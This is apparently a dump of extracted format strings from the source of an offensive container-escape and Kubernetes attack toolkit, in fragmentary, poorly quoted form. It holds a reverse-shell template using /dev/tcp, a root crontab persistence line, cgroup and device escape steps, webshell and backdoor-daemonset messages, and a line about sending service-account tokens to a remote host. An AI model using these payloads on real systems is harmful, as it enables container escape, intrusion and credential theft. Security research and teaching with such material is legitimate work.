		buffer.String(),"
	BannerContainerTpl,"
"Fprintf(os.Stderr, `netcat version: netcat/1.6.0"
"Fprintf(os.Stdout, string(buf))"
"Printf(""%-80s\t%-10s\n"", ""----"", ""------"")"
"Printf(""%-80s\t%-10s\n"", k, v)"
"Printf(""%s: %s"", key, GreenBold.Sprint(value))"
"Printf(""%s: %s"", key, value)"
"Printf(""%s\n"", out)"
"Printf(""%s\n"", strings.Join(matched, ""\n""))"
"Printf(""%s\n"", util.RedBold.Sprint(""Caution: Flag auto-escape is deprecated as of CDK v1.5.1, and will be archived in v2.0. We recommend migrating to `./cdk eva --full` and `./cdk run`.""))"
"Printf(""%v %v\n"", i.Name, a)"
"Printf(""%v"", cli.Args[""<args>""].([]string))"
"Printf(""%v"", err)"
"Printf(""%v\n"", normalizeInput(""root""))"
"Printf(""%v\t%v\t%v\t%v\n"", user, p.Pid, ppid, pexe)"
"Printf(""/proc mounted dir:\n%s\n"", procDir)"
"Printf(""/proc/1/cgroup error: %v\n"", err)"
"Printf(""/proc/self/cgroup error: %v\n"", err)"
"Printf(""/proc/sys/kernel/randomize_va_space file content: %s"", string(data))"
"Printf(""Account: %s:%s is available.\n"", username, password)"
"Printf(""Blockdevice Marjor/Minor number invalid."")"
"Printf(""CapHexParser error: %s"", err)"
"Printf(""Execute Result: \n\n %s \n"", string(retRes))"
"Printf(""Execute Shell:%s failed with error:%s"", cmd, err1.Error())"
"Printf(""Execute Shell:%s finished with output:\n%s"", command, string(output))"
"Printf(""Find mounted lxcfs with rw flags, run `%s` or `%s` to escape container!\n"", util.RedBold.Sprint(""cdk run lxcfs-rw""), util.RedBold.Sprint(""cdk run lxcfs-rw-cgroup""))"
"Printf(""Running with target: %v, ref: %v\n"", target, ref)"
"Printf(""Trigger Release Error: %s \n"", err.Error())"
"Printf(""Trying to create a pod to dump service-account:%s token to remote server %s:%s\n"", targetServiceAccount, rhost, rport)"
"Printf(""User-Defined Shell Payload: %s \n"", cmd)"
"Printf(""Write PID to cgroup.procs failed: %s \n"", err.Error())"
"Printf(""X-Envoy-Peer-Metadata is %s.\n"", result.Header.XEnvoyPeerMetadata)"
"Printf(""X-Envoy-Peer-Metadata-Id is %s.\n"", result.Header.XEnvoyPeerMetadataId)"
"Printf(""[*] Maybe you can exploit the Capabilities below:\n"")"
"Printf(""[+] %s\n"", Tasks[name].Desc())"
"Printf(""[+] Args: %v.\n"", cli.Args[""<args>""])"
"Printf(""[+] Checking kubelet endpoint: %s"", kubeletEndpoint)"
"Printf(""[+] Found /var/log mount success, mount point: %s"", mount.MountPoint)"
"Printf(""[+] Get log file success, file content: \n%s"", fileContent)"
"Printf(""[+] Running exploit: %s.\n"", name)"
"Printf(""[+] You can write the host file '%s' in file path: %s"", targetFile, filepath)"
"Printf(""[+] kubelet log access success, url: %s, response length: %d"", kubeletEndpoint, len(respText))"
"Printf(""[+] run ifconfig, using GetLocalAddresses()"")"
"Printf(""[+] run netstat, using RunNestat()"")"
"Printf(""[-] Get log file error: %v"", err)"
"Printf(""[-] GetGateway error: %v"", err)"
"Printf(""[-] GetMountInfo error: %v"", err)"
"Printf(""[-] Not found /var/log mount"")"
"Printf(""[-] capability.CapHexParser: %v\n"", err)"
"Printf(""[-] kubelet log access error: %v"", err)"
"Printf(""[test] ping -> pong\n"")"
"Printf(""\n%-80s\t%-10s\n"", ""Link"", ""Status"")"
"Printf(""\nInvalid script name: %s , available scripts:\n"", name)"
"Printf(""\n[Auto Escape - Deploy K8s Backdoor Daemonset]\n"")"
"Printf(""\n[Auto Escape - K8s API Server]\n"")"
"Printf(""\n[Auto Escape - Privileged Container]\n"")"
"Printf(""\n[Auto Escape - Shared Net Namespace]\n"")"
"Printf(""\n[Auto Escape - docker.sock]\n"")"
"Printf(""\n[Information Gathering - Cgroups]\n"")"
"Printf(""\n[Information Gathering - SIDs]\n"")"
"Printf(""\n[test] run success\n"")"
"Printf(""\nfound %s in: %s\n%s\n"", k, path, matched)"
"Printf(""\t%s - %s\n"", name, path)"
"Printf(""\t%s Metadata API available in %s\n"", apiInstance.CloudProvider, apiInstance.API)"
"Printf(""\t%s webshell saved in %s\n\tsend codes or system command via post param: %s=(codes)\n"", scriptType, path, param)"
"Printf(""\t%s\n"", line)"
"Printf(""\t%s\n"", v.OriginalInfo)"
"Printf(""\tAdded capability list: %s\n"", capability.CapListToString(addCaps))"
"Printf(""\tCap decode: 0x%s = %s\n"", capStr, capability.CapListToString(caps))"
"Printf(""\tDocs: %s\n"", apiInstance.DocURL)"
"Printf(""\tfound containerd-shim socket in: %s\n"", matched)"
"Printf(""\tlistening port: https://%s:9444\n"", node)"
"Printf(""\trun: kubectl --server=https://%s:9444 --token=%s --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A\n"", node, token)"
"Printf(""\tshadow api-server pod name:%s, namespace:%s, node name:%s\n"", podName, namespace, node)"
"Printf(""available commands:\n\t%s\n"", strings.Join(ans, "",""))"
"Printf(""can not find host path\n"")"
"Printf(""cannot create subgroup :%s"", err)"
"Printf(""cannot decode JSON: %v"", err)"
"Printf(""cannot enable notify_on_release %s"", err)"
"Printf(""client.Do error: %v\n"", err)"
"Printf(""convert major number to int64 err: %v\n"", err)"
"Printf(""convert minor number to int64 err: %v\n"", err)"
"Printf(""current cgroup for exploit: %s \n"", subSysName)"
"Printf(""current docker abs path:\n%s\n"", dockerPath)"
"Printf(""devices.allow content: %s"", devicesAllow)"
"Printf(""ending; @args is ips: %v, max parallels:%v, timeout:%v\n"", ps.ipRange, conf.TCPScannerConf.MaxParallel, ps.timeout)"
"Printf(""err found while open %s: %v\n"", RouteLocalNetProcPath, err)"
"Printf(""error stdout: %s"", cmd.Stdout)"
"Printf(""error when requesting coreDNS: %s\n"", err.Error())"
"Printf(""executing command(%s)...\n"", strings.Join(cmd, "" ""))"
"Printf(""exploit success, run \""debugfs -w host_dev\""."")"
"Printf(""failed to dial %s API."", apiInstance.CloudProvider)"
"Printf(""filter string for mount point is \""%s\"""", filterString)"
"Printf(""final shell exploit is: \n\n"")"
"Printf(""find cgroup devices.allow file: %s\n"", devicesAllowPath)"
"Printf(""find release agent path %s"", releaseAgentPath)"
"Printf(""find release agent subsystem error"")"
"Printf(""found host blockDeviceId Major: %s Minor: %s\n"", mi.Major, mi.Minor)"
"Printf(""found pod devices.allow path: %s\n"", mi.Root)"
"Printf(""found rw lxcfs mountpoint: %s\n"", mi.MountPoint)"
"Printf(""generate cgroup dir: %s\n"", deviceCGroupPath)"
"Printf(""generate cronjob with \n image:%s\n cmd:%s\n schedule:%s\n"", image, inputArgs, schedule)"
"Printf(""generate shell exploit with user-input cmd: \n\n%s\n\n"", cmd)"
"Printf(""get /sys/fs/cgroup/devices/devices.allow inode error: %s\n"", err)"
"Printf(""get /sys/fs/cgroup/devices/devices.allow inode id: %d\n"", inodeID)"
"Printf(""get mount info error: %v"", err)"
"Printf(""http.NewRequest error: %v\n"", err)"
"Printf(""if debugfs can not used, may be you can try to run `./cdk run lxcfs-rw-cgroup 'shell-cmd-payloads`"")"
"Printf(""ipType\t\tconnection\tlocalAddr\t\t\tstatus\t\t\tremoteAddr\t\t\tpid\n"")"
"Printf(""ipv4\t\ttcp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"", fmt.Sprintf(""%s:%d"", stat.Laddr.IP, stat.Laddr.Port), stat.Status, fmt.Sprintf(""%s:%d"", stat.Raddr.IP, stat.Raddr.Port), stat.Pid)"
"Printf(""ipv4\t\tudp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"", fmt.Sprintf(""%s:%d"", stat.Laddr.IP, stat.Laddr.Port), stat.Status, fmt.Sprintf(""%s:%d"", stat.Raddr.IP, stat.Raddr.Port), stat.Pid)"
"Printf(""ipv6\t\ttcp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"", fmt.Sprintf(""%s:%d"", stat.Laddr.IP, stat.Laddr.Port), stat.Status, fmt.Sprintf(""%s:%d"", stat.Raddr.IP, stat.Raddr.Port), stat.Pid)"
"Printf(""ipv6\t\tudp\t\t%-16s\t\t%-13s\t\t%-16s\t\t%d\n"", fmt.Sprintf(""%s:%d"", stat.Laddr.IP, stat.Laddr.Port), stat.Status, fmt.Sprintf(""%s:%d"", stat.Raddr.IP, stat.Raddr.Port), stat.Pid)"
"Printf(""log list: \n%s"", loglistText)"
"Printf(""mknod err: %v"", err)"
"Printf(""net.ipv4.conf.all.route_localnet = %s"", string(data))"
"Printf(""no dir in the %s"", releaseAgentPath)"
"Printf(""open %s: %s:%d\n"", p.Desc, ip, port)"
"Printf(""open devices.list failed. %v\n"", err)"
"Printf(""password dict length: %d.\n"", len(passwordList))"
"Printf(""read devices.list failed. %v\n"", err)"
"Printf(""read execution result file error %s"", err)"
"Printf(""release_agent is not writable %s"", err)"
"Printf(""request apiserver uri `%s` error: %v, response: %s"", opts.Api, err, resp)"
"Printf(""rule { %s: %s } is not allowed."", match[1], match[2])"
"Printf(""run mount -t cgroup -o devices devices /tmp/cdk_dcgroup** error: %s\n"", err)"
"Printf(""scanning %v with user-defined ports, max parallels:%v, timeout:%v\n"", ps.ipRange, parallel, ps.timeout)"
"Printf(""scanning use time:%vms\n"", useTime)"
"Printf(""sensitive env found:\n\t%s"", env)"
"Printf(""service found in process:\n\t%d\t%d\t%s\n"", proc.Pid(), proc.PPid(), proc.Executable())"
"Printf(""set %s\n"", devicesAllowPath)"
"Printf(""set all block device accessible success.\n"")"
"Printf(""set block accessible err %v"", err)"
"Printf(""shell payload:\n%s\n"", shellPayload)"
"Printf(""shell script saved to %s"", outFile)"
"Printf(""success! device %s was mounted to %s\n\n"", device, mountDir)"
"Printf(""the target dir is %s"", targetDir)"
"Printf(""trying to create man in the middle ExternalIPs svc ip: %s and port: %s"", targetIP, targetPort)"
"Printf(""trying to create man in the middle deploy containers with image:%s and port:%s"", image, targetPort)"
"Printf(""trying to deploy daemonset with image:%s to k8s-app:%s"", image, k8sApp)"
"Printf(""trying to run shell cmd: %s\n"", shellCmd)"
"Printf(""trying to spawn shell to %s:%s\n"", rhost, rport)"
"Printf(""user dict length: %d.\n"", len(usernameList))"
"Printf(""user-defined shell payload is: %s \n"", cmd)"
"Printf(""write shell exploit failed\n"")"
"Printf(""writeable cgroup devices.allow not found"")"
"Printf(""you can try another way to exploit, recommend: `./cdk run lxcfs-rw"")"
"Printf(BlueBold.Sprint(""\n[  "") + GreenBold.Sprint(title) + BlueBold.Sprint(""  ]\n""))"
"Printf(util.GreenBold.Sprint(""\n[Information Gathering - System Info]\n""))"
"Sprintf(
"Sprintf(""#!/bin/bash \n %s"", hijackCommand)"
"Sprintf(""%d"", ipExt)"
"Sprintf(""%s %s"", ""CDK Version(GitCommit):"", GitCommit)"
"Sprintf(""%s \t %s \t %s"", kv.ExploitType, kv.Name, kv.Desc)"
"Sprintf(""%s%s"", prefix, format)"
"Sprintf(""%s-%s"", ""cdk-var-log-escape"", util.RandString(10))"
"Sprintf(""%s.%s.%s"", tIp[0], tIp[1], tIp[2])"
"Sprintf(""%s/devices.allow"", deviceCGroupPath)"
"Sprintf(""%s:%d"", ip, port)"
"Sprintf(""%s:%s %s %s %s - %s %s %s"", mi.Major, mi.Minor, mi.Root, mi.MountPoint, optStr, mi.Fstype, mi.Device, superBlockOptionsStr)"
"Sprintf(""%s:%s"", username, password)"
"Sprintf(""%s://%s"", u.Scheme, u.Host)"
"Sprintf(""%s://%s/exec/%s/%s/%s?command=/bin/sh&command=-c&command=%s&error=1&output=1"","
"Sprintf(""%s:\n%s"", e.CustomMsg, e.Err)"
"Sprintf(""%sv2/"", imageRegistryURL)"
"Sprintf(""./%s ."", shellPath)"
"Sprintf(""./%s"", target)); err != nil {"
"Sprintf(""/%s/%s/%s"", namespace, pod, container)"
"Sprintf(""/api/v1/namespaces/%s/pods"", namespace),"
"Sprintf(""/api/v1/namespaces/%s/pods/%s"", namespace, podName),"
"Sprintf(""/cdk_%s"", util.RandString(6))"
"Sprintf(""/cdk_cgexp_%s.sh"", taskRandString)"
"Sprintf(""/proc/%d/gid_map"", reExecCmd.Process.Pid), []byte(gidMapStr), 0644)"
"Sprintf(""/proc/%d/setgroups"", reExecCmd.Process.Pid), []byte(""deny""), 0644)"
"Sprintf(""/proc/%d/uid_map"", reExecCmd.Process.Pid), []byte(uidMapStr), 0644)"
"Sprintf(""/proc/%s/cgroup"", pidStr)"
"Sprintf(""/tmp/%s_%s"", filePreString, taskRandString)"
"Sprintf(""/tmp/cdk_%s"", util.RandString(5))"
"Sprintf(""0 %d 1"", os.Getegid())"
"Sprintf(""0 %d 1"", os.Geteuid())"
"Sprintf(""10.%d.%d.%d"", rand.Intn(256), rand.Intn(256), rand.Intn(256))"
"Sprintf(""Basic %s"", sEnc)"
"Sprintf(""Execute Shell:%s failed"", command)}"
"Sprintf(""[%s] %s"", k, token))"
"Sprintf(""[etcd-get-k8s-token] There are %d pods in kube-system namespace."", len(pods))"
"Sprintf(""\n%s\n* * * * * root %s"", header, shellcode)"
"Sprintf(""bash -i >& /dev/tcp/%s/%s 0>&1"", rhost, rport)"
"Sprintf(""echo \""\n%s\n* * * * * root %s\"" >> %s"", header, shellcmd, crontab)"
"Sprintf(""err found in post request, error response code: %v."", resp.Status)"
"Sprintf(""fail to create mount dir in:%s"", mountDir)}, """""
"Sprintf(""https://%s:10250/"", gateway)"
"Sprintf(""{\""key\"": \""%s\""}"", b64key)"
"Sprintf(""{\""range_end\"": \""%s\"", \""key\"": \""%s\"", \""keys_only\"":true}"", bzero, b64key)"
"Sprintf(""|%s/cmd_%s"", dockerPath, randKey)"
"Sprintf(buffer.String(), defaultRef, defaultTarget, defaultShell))"
"Sprintf(f, v...))"
Printf(BannerHeader)
Printf(RedBold.Sprint(value))
Printf(YellowBold.Sprint(key))
Printf(key)
Printf(value)
Sprintf(`%s
